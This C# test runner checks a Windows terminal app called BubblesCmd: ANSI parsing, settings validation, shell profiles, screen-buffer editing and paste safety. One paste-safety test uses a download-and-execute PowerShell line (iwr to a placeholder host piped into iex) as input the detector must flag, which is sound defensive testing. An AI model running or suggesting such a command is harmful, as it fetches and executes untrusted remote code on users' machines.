using BubblesCmd.Core.Models;
using BubblesCmd.Core.Services;

var tests = new (string Name, Func<Task> Run)[]
{
    ("ansi stripping removes terminal escape sequences", () => RunSync(TestAnsiStripping)),
    ("settings model preserves default profile", () => RunSync(TestSettingsModel)),
    ("profile detector returns the built-in command prompt profile", () => RunSync(TestProfileDetection)),
    ("profile detector lists standard Windows Terminal-style profiles", () => RunSync(TestStandardProfileEntries)),
    ("profile detector orders common Windows Terminal profiles first", () => RunSync(TestProfileOrdering)),
    ("path quoter quotes Windows paths with spaces", () => RunSync(TestPathQuoter)),
    ("settings validator rejects missing custom profile executables", () => RunSync(TestSettingsValidation)),
    ("settings validator rejects huge scrollback values", () => RunSync(TestHugeScrollbackValidation)),
    ("ansi parser preserves colored text segments", () => RunSync(TestAnsiParserColorSegments)),
    ("ansi parser supports true color SGR", () => RunSync(TestAnsiParserTrueColor)),
    ("command discovery finds executables from PATH and PATHEXT", () => RunSync(TestPathCommandDiscovery)),
    ("command discovery includes cmd built-ins from shell help", () => RunSync(TestCmdBuiltInDiscovery)),
    ("settings validator rejects invalid appearance values", () => RunSync(TestAppearanceValidation)),
    ("settings store migrates old readability defaults", () => RunSync(TestSettingsReadabilityMigration)),
    ("terminal screen buffer keeps typed echo on prompt line", () => RunSync(TestTerminalScreenBufferPromptEcho)),
    ("terminal screen buffer handles backspace in place", () => RunSync(TestTerminalScreenBufferBackspace)),
    ("terminal screen buffer handles cursor-left line edits", () => RunSync(TestTerminalScreenBufferCursorLeftEdit)),
    ("terminal screen buffer handles delete-character edits", () => RunSync(TestTerminalScreenBufferDeleteCharacter)),
    ("terminal screen buffer clears carriage-return redraw leftovers", () => RunSync(TestTerminalScreenBufferCarriageReturnRedraw)),
    ("terminal screen buffer removes bare backspace characters", () => RunSync(TestTerminalScreenBufferBareBackspace)),
    ("terminal screen buffer reports caret position", () => RunSync(TestTerminalScreenBufferCaretPosition)),
    ("plugin catalog validates required manifest fields", () => RunSync(TestPluginManifestValidation)),
    ("paste safety analyzer detects hidden control characters", () => RunSync(TestPasteSafetyHiddenControls)),
    ("paste safety analyzer detects risky commands", () => RunSync(TestPasteSafetyRiskyCommands)),
    ("terminal control parser extracts OSC window titles", () => RunSync(TestTerminalControlParserWindowTitle)),
    ("terminal control parser tracks bracketed paste mode", () => RunSync(TestTerminalControlParserBracketedPaste)),
    ("terminal control parser detects bells", () => RunSync(TestTerminalControlParserBell))
};

var failures = new List<string>();

foreach (var (name, run) in tests)
{
    try
    {
        await run();
        Console.WriteLine($"PASS  {name}");
    }
    catch (Exception ex)
    {
        failures.Add($"{name}: {ex.Message}");
        Console.WriteLine($"FAIL  {name}");
    }
}

if (failures.Count > 0)
{
    Console.Error.WriteLine();
    foreach (var failure in failures)
    {
        Console.Error.WriteLine(failure);
    }

    Environment.Exit(1);
}

return;

static void TestAnsiStripping()
{
    var input = "\u001b[31mHello\u001b[0m\r\n";
    var output = AnsiTextSanitizer.StripControlSequences(input);
    Assert(output == "Hello\r\n", $"Expected 'Hello\\r\\n' but received '{output}'.");
}

static void TestSettingsModel()
{
    var settings = new AppSettings
    {
        DefaultProfileId = "cmd",
        ScrollbackLineLimit = 2048
    };

    Assert(settings.DefaultProfileId == "cmd", "Default profile was not stored.");
    Assert(settings.ScrollbackLineLimit == 2048, "Scrollback line limit was not stored.");
}

static void TestProfileDetection()
{
    var detector = new ShellProfileDetector();
    var profiles = detector.DetectProfiles();
    Assert(profiles.Any(profile => profile.Id == "cmd"), "The detector did not include cmd.exe.");
}

static void TestStandardProfileEntries()
{
    var profiles = new ShellProfileDetector().DetectProfiles();
    var names = profiles.Select(profile => profile.DisplayName).ToArray();

    Assert(names.Contains("Windows PowerShell"), "Windows PowerShell was not listed.");
    Assert(names.Contains("Command Prompt"), "Command Prompt was not listed.");
    Assert(names.Contains("Azure Cloud Shell"), "Azure Cloud Shell was not listed.");
    Assert(names.Contains("Developer Command Prompt for VS 2022"), "Developer Command Prompt for VS 2022 was not listed.");
    Assert(names.Contains("Developer PowerShell for VS 2022"), "Developer PowerShell for VS 2022 was not listed.");
}

static void TestProfileOrdering()
{
    var profiles = new ShellProfileDetector().DetectProfiles();
    var powershellIndex = profiles.ToList().FindIndex(profile => profile.Id == "powershell-5");
    var cmdIndex = profiles.ToList().FindIndex(profile => profile.Id == "cmd");

    Assert(powershellIndex >= 0, "Windows PowerShell profile was not detected.");
    Assert(cmdIndex >= 0, "Command Prompt profile was not detected.");
    Assert(powershellIndex < cmdIndex, "Windows PowerShell should be listed before Command Prompt.");
}

static void TestPathQuoter()
{
    var quoted = WindowsPathQuoter.QuoteForShell(@"C:\Program Files\Bubbles CMD\bubbles.exe");
    Assert(quoted == @"""C:\Program Files\Bubbles CMD\bubbles.exe""", $"Unexpected quoted path: {quoted}");
}

static void TestSettingsValidation()
{
    var settings = new AppSettings
    {
        ScrollbackLineLimit = 1000,
        CustomProfiles =
        [
            new ShellProfile(
                "custom-missing",
                "Missing",
                @"C:\Definitely\Not\Installed\bubbles-missing.exe",
                string.Empty,
                Environment.CurrentDirectory)
        ],
        Snippets =
        [
            new CommandSnippet
            {
                Name = "Valid",
                Command = "echo ok"
            }
        ]
    };

    var errors = new SettingsValidator().Validate(settings);
    Assert(errors.Any(error => error.Contains("missing executable", StringComparison.OrdinalIgnoreCase)), "Missing executable was not rejected.");
}

static void TestHugeScrollbackValidation()
{
    var settings = new AppSettings
    {
        ScrollbackLineLimit = 1_000_001
    };

    var errors = new SettingsValidator().Validate(settings);
    Assert(errors.Any(error => error.Contains("1,000,000", StringComparison.OrdinalIgnoreCase)), "Huge scrollback value was not rejected.");
}

static void TestAnsiParserColorSegments()
{
    var parser = new AnsiSequenceParser();
    var segments = parser.Parse("normal \u001b[31;1mred\u001b[0m done");

    Assert(segments.Count == 3, $"Expected 3 segments but received {segments.Count}.");
    Assert(segments[0].Text == "normal ", "First segment text was wrong.");
    Assert(segments[1].Text == "red", "Colored segment text was wrong.");
    Assert(segments[1].Style.Bold, "Bold SGR was not preserved.");
    Assert(segments[1].Style.Foreground == new TerminalColor(205, 49, 49), "Red foreground was not preserved.");
    Assert(segments[2].Style == TerminalTextStyle.Default, "Reset SGR did not restore default style.");
}

static void TestAnsiParserTrueColor()
{
    var parser = new AnsiSequenceParser();
    var segments = parser.Parse("\u001b[38;2;12;34;56mtruecolor");

    Assert(segments.Count == 1, $"Expected 1 segment but received {segments.Count}.");
    Assert(segments[0].Style.Foreground == new TerminalColor(12, 34, 56), "True color foreground was not preserved.");
}

static void TestPathCommandDiscovery()
{
    var tempDirectory = Path.Combine(Path.GetTempPath(), $"bubbles-cmd-test-{Guid.NewGuid():N}");
    Directory.CreateDirectory(tempDirectory);
    try
    {
        var commandPath = Path.Combine(tempDirectory, "bubbles-tool.cmd");
        File.WriteAllText(commandPath, "@echo ok");

        var commands = new CommandDiscoveryService().DiscoverPathCommands(tempDirectory, ".CMD", limit: 10);
        Assert(commands.Any(command => command.Name == "bubbles-tool"), "PATH command discovery did not find the test command.");
    }
    finally
    {
        if (Directory.Exists(tempDirectory))
        {
            Directory.Delete(tempDirectory, recursive: true);
        }
    }
}

static void TestCmdBuiltInDiscovery()
{
    var commandPath = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.System),
        "cmd.exe");
    var commands = new CommandDiscoveryService().DiscoverCmdInternalCommands(commandPath);

    Assert(commands.Any(command => command.Name == "dir" && command.CommandType == "CMD built-in"), "CMD built-in discovery did not include dir.");
    Assert(commands.Any(command => command.Name == "cd" || command.Name == "chdir"), "CMD built-in discovery did not include cd/chdir.");
}

static void TestAppearanceValidation()
{
    var settings = new AppSettings
    {
        Appearance = new TerminalAppearanceSettings
        {
            FontFamily = "",
            FontSize = 4,
            LineHeight = 120,
            BackgroundColor = "black",
            ForegroundColor = "#FFFFFF",
            AccentColor = "#XYZXYZ"
        }
    };

    var errors = new SettingsValidator().Validate(settings);
    Assert(errors.Any(error => error.Contains("font family", StringComparison.OrdinalIgnoreCase)), "Missing font family was not rejected.");
    Assert(errors.Any(error => error.Contains("font size", StringComparison.OrdinalIgnoreCase)), "Invalid font size was not rejected.");
    Assert(errors.Any(error => error.Contains("line height", StringComparison.OrdinalIgnoreCase)), "Invalid line height was not rejected.");
    Assert(errors.Count(error => error.Contains("#RRGGBB", StringComparison.OrdinalIgnoreCase)) == 2, "Invalid colors were not rejected.");
}

static void TestSettingsReadabilityMigration()
{
    var tempDirectory = Path.Combine(Path.GetTempPath(), $"bubbles-cmd-settings-{Guid.NewGuid():N}");
    Directory.CreateDirectory(tempDirectory);
    try
    {
        var settingsPath = Path.Combine(tempDirectory, "settings.json");
        File.WriteAllText(
            settingsPath,
            """
            {
              "version": 1,
              "appearance": {
                "fontFamily": "Cascadia Mono",
                "fontSize": 14,
                "lineHeight": 0,
                "themeName": "Bubbles Dark",
                "backgroundColor": "#080D13",
                "foregroundColor": "#F5F5F5",
                "accentColor": "#5FC9B5",
                "highContrast": false,
                "reducedMotion": false
              }
            }
            """);

        var migrated = new SettingsStore().LoadFrom(settingsPath);
        Assert(migrated.Version == AppSettings.CurrentVersion, "Settings version was not migrated.");
        Assert(Math.Abs(migrated.Appearance.FontSize - 16) < 0.01, "Old terminal font size was not migrated.");
        Assert(migrated.Appearance.BackgroundColor == "#0C0C0C", "Old terminal background was not migrated.");
        Assert(migrated.Appearance.ForegroundColor == "#F2F2F2", "Old terminal foreground was not migrated.");
    }
    finally
    {
        if (Directory.Exists(tempDirectory))
        {
            Directory.Delete(tempDirectory, recursive: true);
        }
    }
}

static void TestTerminalScreenBufferPromptEcho()
{
    var buffer = new TerminalScreenBuffer();
    buffer.Append("Microsoft Windows\r\n\r\nC:\\Users\\bubbles>");
    buffer.Append("dir");

    Assert(
        buffer.GetText().EndsWith("C:\\Users\\bubbles>dir", StringComparison.Ordinal),
        $"Typed echo did not stay on the prompt line. Received '{buffer.GetText()}'.");
}

static void TestTerminalScreenBufferBackspace()
{
    var buffer = new TerminalScreenBuffer();
    buffer.Append("C:\\Users\\bubbles>abc\b \bd");

    Assert(
        buffer.GetText() == "C:\\Users\\bubbles>abd",
        $"Backspace did not edit in place. Received '{buffer.GetText()}'.");
}

static void TestTerminalScreenBufferCursorLeftEdit()
{
    var buffer = new TerminalScreenBuffer();
    buffer.Append("C:\\Users\\bubbles>cls\u001b[2D x");

    Assert(
        buffer.GetText() == "C:\\Users\\bubbles>c x",
        $"Cursor-left edit was not rendered in place. Received '{buffer.GetText()}'.");
}

static void TestTerminalScreenBufferDeleteCharacter()
{
    var buffer = new TerminalScreenBuffer();
    buffer.Append("C:\\Users\\bubbles>clls\u001b[2D\u001b[P");

    Assert(
        buffer.GetText() == "C:\\Users\\bubbles>cls",
        $"Delete-character edit was not rendered in place. Received '{buffer.GetText()}'.");
}

static void TestTerminalScreenBufferCarriageReturnRedraw()
{
    var buffer = new TerminalScreenBuffer();
    buffer.Append("C:\\Users\\bubbles>cc  cls  cls");
    buffer.Append("\rC:\\Users\\bubbles>c");

    Assert(
        buffer.GetText() == "C:\\Users\\bubbles>c",
        $"Carriage-return redraw left old command fragments behind. Received '{buffer.GetText()}'.");
}

static void TestTerminalScreenBufferBareBackspace()
{
    var buffer = new TerminalScreenBuffer();
    buffer.Append("C:\\Users\\bubbles>cls\b");

    Assert(
        buffer.GetText() == "C:\\Users\\bubbles>cl",
        $"Bare backspace did not remove the old character. Received '{buffer.GetText()}'.");
}

static void TestTerminalScreenBufferCaretPosition()
{
    var buffer = new TerminalScreenBuffer();
    buffer.Append("Microsoft Windows\r\n\r\nC:\\Users\\bubbles>cls\u001b[D");

    Assert(
        buffer.GetCaretTextIndex() == buffer.GetText().Length - 1,
        $"Caret did not track the terminal cursor. Text='{buffer.GetText()}', caret={buffer.GetCaretTextIndex()}.");
}

static void TestPluginManifestValidation()
{
    var manifest = new PluginManifest
    {
        Name = "Theme Pack",
        Version = "0.0.2",
        Permissions = ["themes", ""]
    };

    var errors = new PluginCatalogService().Validate(manifest);
    Assert(errors.Any(error => error.Contains("id", StringComparison.OrdinalIgnoreCase)), "Missing plugin id was not rejected.");
    Assert(errors.Any(error => error.Contains("permissions", StringComparison.OrdinalIgnoreCase)), "Blank plugin permission was not rejected.");
}

static void TestPasteSafetyHiddenControls()
{
    var review = new PasteSafetyAnalyzer().Analyze(
        "echo safe\u001b[2J",
        warnOnMultiline: true,
        warnOnRiskyCommand: true,
        warnOnHiddenControlCharacters: true);

    Assert(review.HasHiddenControlCharacters, "ESC control character was not detected.");
    Assert(review.RequiresReview, "Hidden control characters did not require review.");
}

static void TestPasteSafetyRiskyCommands()
{
    var review = new PasteSafetyAnalyzer().Analyze(
        "iwr https://example.invalid/a.ps1 | iex",
        warnOnMultiline: true,
        warnOnRiskyCommand: true,
        warnOnHiddenControlCharacters: true);

    Assert(review.HasRiskyCommand, "Download-and-execute pattern was not detected.");
    Assert(review.Reasons.Any(reason => reason.Contains("destructive", StringComparison.OrdinalIgnoreCase)), "Risky paste reason was not reported.");
}

static void TestTerminalControlParserWindowTitle()
{
    var result = new TerminalControlSequenceParser().Parse("before\u001b]0;Bubbles Build\u0007after");

    Assert(result.Text == "beforeafter", $"OSC title sequence was not stripped. Received '{result.Text}'.");
    Assert(result.WindowTitle == "Bubbles Build", $"OSC title was not extracted. Received '{result.WindowTitle}'.");
}

static void TestTerminalControlParserBracketedPaste()
{
    var enabled = new TerminalControlSequenceParser().Parse("before\u001b[?2004hafter");
    var disabled = new TerminalControlSequenceParser().Parse("before\u001b[?2004lafter");

    Assert(enabled.Text == "beforeafter", $"Bracketed paste enable sequence was not stripped. Received '{enabled.Text}'.");
    Assert(enabled.BracketedPasteEnabled == true, "Bracketed paste enable was not detected.");
    Assert(disabled.Text == "beforeafter", $"Bracketed paste disable sequence was not stripped. Received '{disabled.Text}'.");
    Assert(disabled.BracketedPasteEnabled == false, "Bracketed paste disable was not detected.");
}

static void TestTerminalControlParserBell()
{
    var result = new TerminalControlSequenceParser().Parse("before\u0007after\u0007");

    Assert(result.Text == "beforeafter", $"Bell characters were not stripped. Received '{result.Text}'.");
    Assert(result.BellCount == 2, $"Expected 2 bells but received {result.BellCount}.");
}

static Task RunSync(Action action)
{
    action();
    return Task.CompletedTask;
}

static void Assert(bool condition, string message)
{
    if (!condition)
    {
        throw new InvalidOperationException(message);
    }
}
